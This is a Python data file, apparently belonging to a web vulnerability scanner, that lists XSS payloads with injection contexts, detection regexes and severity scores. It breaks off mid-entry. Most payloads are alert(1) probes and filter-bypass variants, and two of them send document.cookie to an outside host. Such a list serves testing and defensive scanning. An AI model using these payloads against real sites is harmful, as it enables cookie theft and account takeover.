"""xss payload library — generated dev-time by Claude.

Regenerate via tools/_gen/gen_payloads.py xss. Zero runtime cost.
"""

XSS_PAYLOADS = [
  {
    "payload": "<script>alert(1)</script>",
    "context": "html",
    "matcher": "<script>alert\\(1\\)</script>",
    "severity": "CRITICAL",
    "cvss": 9.3
  },
  {
    "payload": "<img src=x onerror=alert(1)>",
    "context": "html",
    "matcher": "onerror=alert\\(1\\)",
    "severity": "CRITICAL",
    "cvss": 9.3
  },
  {
    "payload": "<svg onload=alert(1)>",
    "context": "html",
    "matcher": "<svg onload=alert\\(1\\)>",
    "severity": "CRITICAL",
    "cvss": 9.3
  },
  {
    "payload": "<body onload=alert(1)>",
    "context": "html",
    "matcher": "onload=alert\\(1\\)",
    "severity": "CRITICAL",
    "cvss": 9.3
  },
  {
    "payload": "<iframe src=javascript:alert(1)>",
    "context": "html",
    "matcher": "javascript:alert\\(1\\)",
    "severity": "CRITICAL",
    "cvss": 9.3
  },
  {
    "payload": "<details open ontoggle=alert(1)>",
    "context": "html",
    "matcher": "ontoggle=alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 8.8
  },
  {
    "payload": "<video><source onerror=alert(1)>",
    "context": "html",
    "matcher": "onerror=alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 8.8
  },
  {
    "payload": "<math><mtext></mtext><mglyph><svg><mtext></mtext><altglyph id=x>",
    "context": "html",
    "matcher": "altglyph",
    "severity": "HIGH",
    "cvss": 8.1
  },
  {
    "payload": "<table><td background=javascript:alert(1)>",
    "context": "html",
    "matcher": "background=javascript",
    "severity": "HIGH",
    "cvss": 8.1
  },
  {
    "payload": "<object data=javascript:alert(1)>",
    "context": "html",
    "matcher": "data=javascript:alert",
    "severity": "CRITICAL",
    "cvss": 9.0
  },
  {
    "payload": "<embed src=javascript:alert(1)>",
    "context": "html",
    "matcher": "src=javascript:alert",
    "severity": "CRITICAL",
    "cvss": 9.0
  },
  {
    "payload": "<link rel=stylesheet href=javascript:alert(1)>",
    "context": "html",
    "matcher": "href=javascript:alert",
    "severity": "HIGH",
    "cvss": 8.5
  },
  {
    "payload": "<form action=javascript:alert(1)><input type=submit>",
    "context": "html",
    "matcher": "action=javascript:alert",
    "severity": "HIGH",
    "cvss": 8.5
  },
  {
    "payload": "<isindex type=image src=1 onerror=alert(1)>",
    "context": "html",
    "matcher": "onerror=alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 8.1
  },
  {
    "payload": "<marquee onstart=alert(1)>",
    "context": "html",
    "matcher": "onstart=alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 8.1
  },
  {
    "payload": "<input autofocus onfocus=alert(1)>",
    "context": "html",
    "matcher": "onfocus=alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 8.1
  },
  {
    "payload": "<select autofocus onfocus=alert(1)>",
    "context": "html",
    "matcher": "onfocus=alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 8.1
  },
  {
    "payload": "<textarea autofocus onfocus=alert(1)>",
    "context": "html",
    "matcher": "onfocus=alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 8.1
  },
  {
    "payload": "<keygen autofocus onfocus=alert(1)>",
    "context": "html",
    "matcher": "onfocus=alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 8.1
  },
  {
    "payload": "<audio src=x onerror=alert(1)>",
    "context": "html",
    "matcher": "onerror=alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 8.8
  },
  {
    "payload": "<script src=data:,alert(1)></script>",
    "context": "html",
    "matcher": "data:,alert\\(1\\)",
    "severity": "CRITICAL",
    "cvss": 9.3
  },
  {
    "payload": "<noscript><p title=\"</noscript><script>alert(1)</script>\">",
    "context": "html",
    "matcher": "alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 8.5
  },
  {
    "payload": "<template><script>alert(1)</script></template>",
    "context": "html",
    "matcher": "alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 8.5
  },
  {
    "payload": "<svg><script>alert(1)</script></svg>",
    "context": "html",
    "matcher": "alert\\(1\\)",
    "severity": "CRITICAL",
    "cvss": 9.3
  },
  {
    "payload": "<math><script>alert(1)</script></math>",
    "context": "html",
    "matcher": "alert\\(1\\)",
    "severity": "CRITICAL",
    "cvss": 9.3
  },
  {
    "payload": "<figure><img src=x onerror=alert(1)></figure>",
    "context": "html",
    "matcher": "onerror=alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 8.8
  },
  {
    "payload": "<picture><source srcset=x onerror=alert(1)></picture>",
    "context": "html",
    "matcher": "onerror=alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 8.8
  },
  {
    "payload": "<meta http-equiv=refresh content=0;url=javascript:alert(1)>",
    "context": "html",
    "matcher": "javascript:alert\\(1\\)",
    "severity": "CRITICAL",
    "cvss": 9.0
  },
  {
    "payload": "<frameset onload=alert(1)><frame>",
    "context": "html",
    "matcher": "onload=alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 8.5
  },
  {
    "payload": "<base href=javascript:alert(1)><a href=>click</a>",
    "context": "html",
    "matcher": "javascript:alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 8.5
  },
  {
    "payload": "<p onmouseover=alert(1)>hover",
    "context": "html",
    "matcher": "onmouseover=alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 7.5
  },
  {
    "payload": "<div onclick=alert(1)>click",
    "context": "html",
    "matcher": "onclick=alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 7.5
  },
  {
    "payload": "<button onclick=alert(1)>click",
    "context": "html",
    "matcher": "onclick=alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 7.5
  },
  {
    "payload": "<a href=javascript:alert(1)>click</a>",
    "context": "html",
    "matcher": "javascript:alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 8.5
  },
  {
    "payload": "<style>*{background:url(javascript:alert(1))}</style>",
    "context": "html",
    "matcher": "javascript:alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 8.5
  },
  {
    "payload": "<xmp><p title=\"</xmp><svg/onload=alert(1)>\">",
    "context": "html",
    "matcher": "alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 8.1
  },
  {
    "payload": "<plaintext><svg/onload=alert(1)>",
    "context": "html",
    "matcher": "alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 8.1
  },
  {
    "payload": "<listing><img/src=x onerror=alert(1)>",
    "context": "html",
    "matcher": "onerror=alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 8.1
  },
  {
    "payload": "<table><tr><td></td></tr></table><svg onload=alert(1)>",
    "context": "html",
    "matcher": "onload=alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 8.5
  },
  {
    "payload": "<script>alert`1`</script>",
    "context": "html",
    "matcher": "alert`1`",
    "severity": "CRITICAL",
    "cvss": 9.3
  },
  {
    "payload": "\" onmouseover=\"alert(1)",
    "context": "attribute",
    "matcher": "onmouseover=.alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 8.1
  },
  {
    "payload": "' onfocus='alert(1)",
    "context": "attribute",
    "matcher": "onfocus=.alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 8.1
  },
  {
    "payload": "\" autofocus onfocus=\"alert(1)",
    "context": "attribute",
    "matcher": "onfocus=.alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 8.1
  },
  {
    "payload": "\" onerror=\"alert(1)",
    "context": "attribute",
    "matcher": "onerror=.alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 8.1
  },
  {
    "payload": "' onload='alert(1)",
    "context": "attribute",
    "matcher": "onload=.alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 8.1
  },
  {
    "payload": "\" onclick=\"alert(1)",
    "context": "attribute",
    "matcher": "onclick=.alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 7.5
  },
  {
    "payload": "javascript:alert(1)",
    "context": "attribute",
    "matcher": "javascript:alert\\(1\\)",
    "severity": "CRITICAL",
    "cvss": 9.0
  },
  {
    "payload": "\" style=\"x:expression(alert(1))",
    "context": "attribute",
    "matcher": "expression\\(alert",
    "severity": "HIGH",
    "cvss": 8.1
  },
  {
    "payload": "' style='background:url(javascript:alert(1))",
    "context": "attribute",
    "matcher": "javascript:alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 8.1
  },
  {
    "payload": "\";<script>alert(1)</script>",
    "context": "attribute",
    "matcher": "alert\\(1\\)",
    "severity": "CRITICAL",
    "cvss": 9.0
  },
  {
    "payload": "\" onpointerover=\"alert(1)",
    "context": "attribute",
    "matcher": "onpointerover=.alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 7.5
  },
  {
    "payload": "\" ontouchstart=\"alert(1)",
    "context": "attribute",
    "matcher": "ontouchstart=.alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 7.5
  },
  {
    "payload": "\" onanimationstart=\"alert(1)",
    "context": "attribute",
    "matcher": "onanimationstart=.alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 7.5
  },
  {
    "payload": "\" data-x=\"><script>alert(1)</script>",
    "context": "attribute",
    "matcher": "alert\\(1\\)",
    "severity": "CRITICAL",
    "cvss": 9.0
  },
  {
    "payload": "\" onmouseenter=\"alert(1)",
    "context": "attribute",
    "matcher": "onmouseenter=.alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 7.5
  },
  {
    "payload": "\" onkeydown=\"alert(1)",
    "context": "attribute",
    "matcher": "onkeydown=.alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 7.5
  },
  {
    "payload": "\" onblur=\"alert(1) \"",
    "context": "attribute",
    "matcher": "onblur=.alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 7.5
  },
  {
    "payload": "' onmousemove='alert(1)",
    "context": "attribute",
    "matcher": "onmousemove=.alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 7.5
  },
  {
    "payload": "\" tabindex=1 onfocus=\"alert(1)",
    "context": "attribute",
    "matcher": "onfocus=.alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 8.1
  },
  {
    "payload": "\" onscroll=\"alert(1)",
    "context": "attribute",
    "matcher": "onscroll=.alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 7.5
  },
  {
    "payload": "\" onwheel=\"alert(1)",
    "context": "attribute",
    "matcher": "onwheel=.alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 7.5
  },
  {
    "payload": "\" ondblclick=\"alert(1)",
    "context": "attribute",
    "matcher": "ondblclick=.alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 7.5
  },
  {
    "payload": "\" oncontextmenu=\"alert(1)",
    "context": "attribute",
    "matcher": "oncontextmenu=.alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 7.5
  },
  {
    "payload": "\" formaction=\"javascript:alert(1)",
    "context": "attribute",
    "matcher": "javascript:alert\\(1\\)",
    "severity": "CRITICAL",
    "cvss": 9.0
  },
  {
    "payload": "\" srcdoc=\"<script>alert(1)</script>",
    "context": "attribute",
    "matcher": "alert\\(1\\)",
    "severity": "CRITICAL",
    "cvss": 9.0
  },
  {
    "payload": "\" action=\"javascript:alert(1)",
    "context": "attribute",
    "matcher": "javascript:alert\\(1\\)",
    "severity": "CRITICAL",
    "cvss": 9.0
  },
  {
    "payload": "' onpointerdown='alert(1)",
    "context": "attribute",
    "matcher": "onpointerdown=.alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 7.5
  },
  {
    "payload": "\" oninput=\"alert(1)",
    "context": "attribute",
    "matcher": "oninput=.alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 7.5
  },
  {
    "payload": "';alert(1)//",
    "context": "js",
    "matcher": "';alert\\(1\\)",
    "severity": "CRITICAL",
    "cvss": 9.3
  },
  {
    "payload": "\";alert(1)//",
    "context": "js",
    "matcher": "\";alert\\(1\\)",
    "severity": "CRITICAL",
    "cvss": 9.3
  },
  {
    "payload": "</script><script>alert(1)</script>",
    "context": "js",
    "matcher": "alert\\(1\\)",
    "severity": "CRITICAL",
    "cvss": 9.3
  },
  {
    "payload": "'-alert(1)-'",
    "context": "js",
    "matcher": "'-alert\\(1\\)-'",
    "severity": "CRITICAL",
    "cvss": 9.3
  },
  {
    "payload": "\"-alert(1)-\"",
    "context": "js",
    "matcher": "\"-alert\\(1\\)-\"",
    "severity": "CRITICAL",
    "cvss": 9.3
  },
  {
    "payload": "\\';alert(1)//",
    "context": "js",
    "matcher": "alert\\(1\\)",
    "severity": "CRITICAL",
    "cvss": 9.3
  },
  {
    "payload": "`;alert(1)//",
    "context": "js",
    "matcher": "`;alert\\(1\\)",
    "severity": "CRITICAL",
    "cvss": 9.3
  },
  {
    "payload": "${alert(1)}",
    "context": "js",
    "matcher": "\\$\\{alert\\(1\\)\\}",
    "severity": "CRITICAL",
    "cvss": 9.3
  },
  {
    "payload": "'+alert(1)+'",
    "context": "js",
    "matcher": "\\+alert\\(1\\)\\+",
    "severity": "CRITICAL",
    "cvss": 9.3
  },
  {
    "payload": "\"+alert(1)+\"",
    "context": "js",
    "matcher": "\\+alert\\(1\\)\\+",
    "severity": "CRITICAL",
    "cvss": 9.3
  },
  {
    "payload": "';alert(String.fromCharCode(88,83,83))//",
    "context": "js",
    "matcher": "fromCharCode",
    "severity": "HIGH",
    "cvss": 8.5
  },
  {
    "payload": "</script><img src=x onerror=alert(1)>",
    "context": "js",
    "matcher": "onerror=alert\\(1\\)",
    "severity": "CRITICAL",
    "cvss": 9.3
  },
  {
    "payload": "'};alert(1)//",
    "context": "js",
    "matcher": "'};alert\\(1\\)",
    "severity": "CRITICAL",
    "cvss": 9.3
  },
  {
    "payload": "\"};</script><script>alert(1)</script>",
    "context": "js",
    "matcher": "alert\\(1\\)",
    "severity": "CRITICAL",
    "cvss": 9.3
  },
  {
    "payload": "';window['ale'+'rt'](1)//",
    "context": "js",
    "matcher": "window\\[",
    "severity": "HIGH",
    "cvss": 8.8
  },
  {
    "payload": "';<svg/onload=alert(1)>//",
    "context": "js",
    "matcher": "onload=alert\\(1\\)",
    "severity": "CRITICAL",
    "cvss": 9.3
  },
  {
    "payload": "\\u0027;alert(1)//",
    "context": "js",
    "matcher": "alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 8.5
  },
  {
    "payload": "'+String.fromCharCode(120,115,115)+'",
    "context": "js",
    "matcher": "fromCharCode",
    "severity": "HIGH",
    "cvss": 8.5
  },
  {
    "payload": "';eval(atob('YWxlcnQoMSk='))//",
    "context": "js",
    "matcher": "atob\\(",
    "severity": "HIGH",
    "cvss": 8.8
  },
  {
    "payload": "';setTimeout(alert,0,1)//",
    "context": "js",
    "matcher": "setTimeout\\(alert",
    "severity": "HIGH",
    "cvss": 8.5
  },
  {
    "payload": "';(()=>{alert(1)})()//",
    "context": "js",
    "matcher": "alert\\(1\\)",
    "severity": "CRITICAL",
    "cvss": 9.3
  },
  {
    "payload": "';throw new Error(alert(1))//",
    "context": "js",
    "matcher": "alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 8.5
  },
  {
    "payload": "';Function('alert(1)')()//",
    "context": "js",
    "matcher": "Function\\(",
    "severity": "HIGH",
    "cvss": 8.8
  },
  {
    "payload": "'-prompt(1)-'",
    "context": "js",
    "matcher": "prompt\\(1\\)",
    "severity": "CRITICAL",
    "cvss": 9.3
  },
  {
    "payload": "';location='javascript:alert(1)'//",
    "context": "js",
    "matcher": "javascript:alert",
    "severity": "HIGH",
    "cvss": 8.8
  },
  {
    "payload": "javascript:alert(1)",
    "context": "url",
    "matcher": "javascript:alert\\(1\\)",
    "severity": "CRITICAL",
    "cvss": 9.0
  },
  {
    "payload": "javascript://%0aalert(1)",
    "context": "url",
    "matcher": "javascript:.*alert\\(1\\)",
    "severity": "CRITICAL",
    "cvss": 9.0
  },
  {
    "payload": "javascript:alert(1)//",
    "context": "url",
    "matcher": "javascript:alert\\(1\\)",
    "severity": "CRITICAL",
    "cvss": 9.0
  },
  {
    "payload": "javascript&#58;alert(1)",
    "context": "url",
    "matcher": "javascript.{0,10}alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 8.5
  },
  {
    "payload": "data:text/html,<script>alert(1)</script>",
    "context": "url",
    "matcher": "alert\\(1\\)",
    "severity": "CRITICAL",
    "cvss": 9.0
  },
  {
    "payload": "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    "context": "url",
    "matcher": "base64",
    "severity": "HIGH",
    "cvss": 8.5
  },
  {
    "payload": "vbscript:alert(1)",
    "context": "url",
    "matcher": "vbscript:alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 8.5
  },
  {
    "payload": "javascript:void(alert(1))",
    "context": "url",
    "matcher": "void\\(alert\\(1\\)\\)",
    "severity": "HIGH",
    "cvss": 8.5
  },
  {
    "payload": "%6a%61%76%61%73%63%72%69%70%74:alert(1)",
    "context": "url",
    "matcher": "alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 8.5
  },
  {
    "payload": "javascript://<br>alert(1)",
    "context": "url",
    "matcher": "alert\\(1\\)",
    "severity": "CRITICAL",
    "cvss": 9.0
  },
  {
    "payload": "java\nscript:alert(1)",
    "context": "url",
    "matcher": "alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 8.5
  },
  {
    "payload": "java\rscript:alert(1)",
    "context": "url",
    "matcher": "alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 8.5
  },
  {
    "payload": "javascript:alert(document.domain)",
    "context": "url",
    "matcher": "document\\.domain",
    "severity": "CRITICAL",
    "cvss": 9.3
  },
  {
    "payload": "javascript:alert(document.cookie)",
    "context": "url",
    "matcher": "document\\.cookie",
    "severity": "CRITICAL",
    "cvss": 9.8
  },
  {
    "payload": "jaVasCript:alert(1)",
    "context": "url",
    "matcher": "alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 8.5
  },
  {
    "payload": "<a id=x><a id=x name=x>",
    "context": "dom",
    "matcher": "id=x",
    "severity": "HIGH",
    "cvss": 7.5
  },
  {
    "payload": "<form id=x><output id=y>",
    "context": "dom",
    "matcher": "id=x",
    "severity": "HIGH",
    "cvss": 7.5
  },
  {
    "payload": "<img id=FILTER><script>alert(FILTER.src)</script>",
    "context": "dom",
    "matcher": "FILTER",
    "severity": "CRITICAL",
    "cvss": 9.0
  },
  {
    "payload": "<a id=document><a id=document name=cookie>",
    "context": "dom",
    "matcher": "id=document",
    "severity": "HIGH",
    "cvss": 8.5
  },
  {
    "payload": "<form id=location><input id=href value=javascript:alert(1)>",
    "context": "dom",
    "matcher": "javascript:alert",
    "severity": "CRITICAL",
    "cvss": 9.0
  },
  {
    "payload": "<img name=getElementById><script>alert(document.getElementById)</script>",
    "context": "dom",
    "matcher": "getElementById",
    "severity": "HIGH",
    "cvss": 8.5
  },
  {
    "payload": "<form id=x name=x><input name=attributes>",
    "context": "dom",
    "matcher": "name=attributes",
    "severity": "HIGH",
    "cvss": 7.5
  },
  {
    "payload": "<a id=toString>",
    "context": "dom",
    "matcher": "id=toString",
    "severity": "HIGH",
    "cvss": 7.5
  },
  {
    "payload": "<x id=write name=write>",
    "context": "dom",
    "matcher": "id=write",
    "severity": "HIGH",
    "cvss": 8.1
  },
  {
    "payload": "<img id=URL><script>alert(document.URL)</script>",
    "context": "dom",
    "matcher": "document\\.URL",
    "severity": "CRITICAL",
    "cvss": 9.0
  },
  {
    "payload": "<a id=eval><a id=eval name=eval>",
    "context": "dom",
    "matcher": "id=eval",
    "severity": "HIGH",
    "cvss": 8.5
  },
  {
    "payload": "<form id=encodeURI><input id=encodeURI name=call>",
    "context": "dom",
    "matcher": "encodeURI",
    "severity": "HIGH",
    "cvss": 7.5
  },
  {
    "payload": "<iframe name=top>",
    "context": "dom",
    "matcher": "name=top",
    "severity": "HIGH",
    "cvss": 7.5
  },
  {
    "payload": "<form name=document><input name=createElement value=x>",
    "context": "dom",
    "matcher": "name=document",
    "severity": "HIGH",
    "cvss": 8.5
  },
  {
    "payload": "<img name=location>",
    "context": "dom",
    "matcher": "name=location",
    "severity": "HIGH",
    "cvss": 8.5
  },
  {
    "payload": "<svg><svg onload=\"javascript:alert(1)\">",
    "context": "mutation",
    "matcher": "alert\\(1\\)",
    "severity": "CRITICAL",
    "cvss": 9.3
  },
  {
    "payload": "<noembed><img src=x onerror=alert(1)></noembed>",
    "context": "mutation",
    "matcher": "onerror=alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 8.5
  },
  {
    "payload": "<math><mi//xlink:href=data:x,<script>alert(1)</script>>",
    "context": "mutation",
    "matcher": "alert\\(1\\)",
    "severity": "CRITICAL",
    "cvss": 9.3
  },
  {
    "payload": "<table><noscript><p><img src=x onerror=alert(1)></noscript></table>",
    "context": "mutation",
    "matcher": "onerror=alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 8.5
  },
  {
    "payload": "<iframe/src/onload=alert(1)>",
    "context": "mutation",
    "matcher": "onload=alert\\(1\\)",
    "severity": "CRITICAL",
    "cvss": 9.3
  },
  {
    "payload": "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "context": "waf-bypass",
    "matcher": "alert\\(1\\)",
    "severity": "CRITICAL",
    "cvss": 9.3
  },
  {
    "payload": "<ScRiPt>alert(1)</sCrIpT>",
    "context": "waf-bypass",
    "matcher": "(?i)alert\\(1\\)",
    "severity": "CRITICAL",
    "cvss": 9.3
  },
  {
    "payload": "<img src=x onerror=\"&#97;&#108;&#101;&#114;&#116;(1)\">",
    "context": "waf-bypass",
    "matcher": "onerror=",
    "severity": "HIGH",
    "cvss": 8.8
  },
  {
    "payload": "<svg/onload=&#97;&#108;&#101;&#114;&#116;&#40;1&#41;>",
    "context": "waf-bypass",
    "matcher": "onload=",
    "severity": "HIGH",
    "cvss": 8.8
  },
  {
    "payload": "<img src=x onerror=\\u0061lert(1)>",
    "context": "waf-bypass",
    "matcher": "onerror=",
    "severity": "HIGH",
    "cvss": 8.5
  },
  {
    "payload": "<script>\\u0061lert(1)</script>",
    "context": "waf-bypass",
    "matcher": "alert\\(1\\)|\\\\u0061",
    "severity": "HIGH",
    "cvss": 8.5
  },
  {
    "payload": "<SCRIPT>alert(1)</SCRIPT>",
    "context": "waf-bypass",
    "matcher": "(?i)alert\\(1\\)",
    "severity": "CRITICAL",
    "cvss": 9.3
  },
  {
    "payload": "<img src=\"x\" onerror=\"alert(1)\" />",
    "context": "waf-bypass",
    "matcher": "onerror=.alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 8.8
  },
  {
    "payload": "<a href=j&#97v&#97script:alert(1)>click",
    "context": "waf-bypass",
    "matcher": "alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 8.5
  },
  {
    "payload": "<img src=x onerror=alert(1) x>",
    "context": "waf-bypass",
    "matcher": "onerror=alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 8.8
  },
  {
    "payload": "<svg onload=alert(1) xmlns=>",
    "context": "waf-bypass",
    "matcher": "onload=alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 8.8
  },
  {
    "payload": "<<script>alert(1)//<</script>",
    "context": "waf-bypass",
    "matcher": "alert\\(1\\)",
    "severity": "CRITICAL",
    "cvss": 9.3
  },
  {
    "payload": "<script>alert(1)<!--",
    "context": "waf-bypass",
    "matcher": "alert\\(1\\)",
    "severity": "CRITICAL",
    "cvss": 9.3
  },
  {
    "payload": "<img onerror=alert(1) src=>",
    "context": "waf-bypass",
    "matcher": "onerror=alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 8.8
  },
  {
    "payload": "<svg><![CDATA[><img src=x onerror=alert(1)>]]>",
    "context": "waf-bypass",
    "matcher": "alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 8.5
  },
  {
    "payload": "<script>window['alert'](1)</script>",
    "context": "waf-bypass",
    "matcher": "window\\['alert'\\]",
    "severity": "HIGH",
    "cvss": 8.8
  },
  {
    "payload": "<script>top['alert'](1)</script>",
    "context": "waf-bypass",
    "matcher": "top\\['alert'\\]",
    "severity": "HIGH",
    "cvss": 8.8
  },
  {
    "payload": "<script>self['alert'](1)</script>",
    "context": "waf-bypass",
    "matcher": "self\\['alert'\\]",
    "severity": "HIGH",
    "cvss": 8.8
  },
  {
    "payload": "<script>globalThis.alert(1)</script>",
    "context": "waf-bypass",
    "matcher": "globalThis\\.alert",
    "severity": "HIGH",
    "cvss": 8.8
  },
  {
    "payload": "<img src=x onerror=\"eval(String.fromCharCode(97,108,101,114,116,40,49,41))\">",
    "context": "waf-bypass",
    "matcher": "fromCharCode",
    "severity": "HIGH",
    "cvss": 8.8
  },
  {
    "payload": "<script>/*<!--*/alert(1)/*-->*/</script>",
    "context": "waf-bypass",
    "matcher": "alert\\(1\\)",
    "severity": "CRITICAL",
    "cvss": 9.3
  },
  {
    "payload": "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
    "context": "html",
    "matcher": "onbegin=alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 8.5
  },
  {
    "payload": "<svg><set attributeName=onmouseover value=alert(1)>",
    "context": "html",
    "matcher": "value=alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 8.1
  },
  {
    "payload": "<svg><use href=data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>#x>",
    "context": "html",
    "matcher": "alert\\(1\\)",
    "severity": "CRITICAL",
    "cvss": 9.3
  },
  {
    "payload": "<video src=x onloadstart=alert(1)>",
    "context": "html",
    "matcher": "onloadstart=alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 8.8
  },
  {
    "payload": "<svg><a xlink:href=javascript:alert(1)><text>click</text></a></svg>",
    "context": "html",
    "matcher": "javascript:alert\\(1\\)",
    "severity": "CRITICAL",
    "cvss": 9.0
  },
  {
    "payload": "<input type=image src=x onerror=alert(1)>",
    "context": "html",
    "matcher": "onerror=alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 8.8
  },
  {
    "payload": "<iframe onload=alert(1) src=about:blank>",
    "context": "html",
    "matcher": "onload=alert\\(1\\)",
    "severity": "CRITICAL",
    "cvss": 9.0
  },
  {
    "payload": "<script>location=`javascript:alert(1)`</script>",
    "context": "html",
    "matcher": "javascript:alert\\(1\\)",
    "severity": "CRITICAL",
    "cvss": 9.3
  },
  {
    "payload": "<script>document.write('<img src=x onerror=alert(1)>')</script>",
    "context": "html",
    "matcher": "alert\\(1\\)",
    "severity": "CRITICAL",
    "cvss": 9.3
  },
  {
    "payload": "<script>document.body.innerHTML='<svg/onload=alert(1)>'</script>",
    "context": "html",
    "matcher": "alert\\(1\\)",
    "severity": "CRITICAL",
    "cvss": 9.3
  },
  {
    "payload": "<script>fetch('//x?c='+document.cookie)</script>",
    "context": "html",
    "matcher": "document\\.cookie",
    "severity": "CRITICAL",
    "cvss": 9.8
  },
  {
    "payload": "<script>new Image().src='//x?'+document.cookie</script>",
    "context": "html",
    "matcher": "document\\.cookie",
    "severity": "CRITICAL",
    "cvss": 9.8
  },
  {
    "payload": "\" onpointerrawupdate=\"alert(1)",
    "context": "attribute",
    "matcher": "onpointerrawupdate=.alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 7.5
  },
  {
    "payload": "\" onfocusin=\"alert(1)",
    "context": "attribute",
    "matcher": "onfocusin=.alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 7.5
  },
  {
    "payload": "\" oncut=\"alert(1)",
    "context": "attribute",
    "matcher": "oncut=.alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 7.5
  },
  {
    "payload": "\" oncopy=\"alert(1)",
    "context": "attribute",
    "matcher": "oncopy=.alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 7.5
  },
  {
    "payload": "\" onpaste=\"alert(1)",
    "context": "attribute",
    "matcher": "onpaste=.alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 7.5
  },
  {
    "payload": "\" ondragenter=\"alert(1)",
    "context": "attribute",
    "matcher": "ondragenter=.alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 7.5
  },
  {
    "payload": "\" ontransitionend=\"alert(1)",
    "context": "attribute",
    "matcher": "ontransitionend=.alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 7.5
  },
  {
    "payload": "';Object.keys(window).find(k=>alert(k))//",
    "context": "js",
    "matcher": "Object\\.keys",
    "severity": "HIGH",
    "cvss": 8.5
  },
  {
    "payload": "';Object.assign(window,{a:alert(1)})//",
    "context": "js",
    "matcher": "Object\\.assign",
    "severity": "HIGH",
    "cvss": 8.5
  },
  {
    "payload": "';import('data:text/javascript,alert(1)')//",
    "context": "js",
    "matcher": "import\\(",
    "severity": "HIGH",
    "cvss": 8.8
  },
  {
    "payload": "';Reflect.apply(alert,null,[1])//",
    "context": "js",
    "matcher": "Reflect\\.apply",
    "severity": "HIGH",
    "cvss": 8.5
  },
  {
    "payload": "';Proxy&&new Proxy({},{get:()=>alert(1)}).x//",
    "context": "js",
    "matcher": "Proxy",
    "severity": "HIGH",
    "cvss": 8.5
  },
  {
    "payload": "<img src=x onerror=import('data:text/javascript,alert(1)')>",
    "context": "waf-bypass",
    "matcher": "import\\(",
    "severity": "HIGH",
    "cvss": 8.8
  },
  {
    "payload": "<svg onload=\"al\\u0065rt(1)\">",
    "context": "waf-bypass",
    "matcher": "al.ert\\(1\\)|onload=",
    "severity": "HIGH",
    "cvss": 8.5
  },
  {
    "payload": "<iframe src=javascript&#x3A;alert(1)>",
    "context": "waf-bypass",
    "matcher": "alert\\(1\\)",
    "severity": "CRITICAL",
    "cvss": 9.0
  },
  {
    "payload": "<a href=\"jav&#x09;ascript:alert(1)\">click</a>",
    "context": "waf-bypass",
    "matcher": "alert\\(1\\)",
    "severity": "HIGH",
    "cvss": 8.5
  },
  {
    "payload": "<a href=\"jav\nascript:alert(1)\">click</a>",
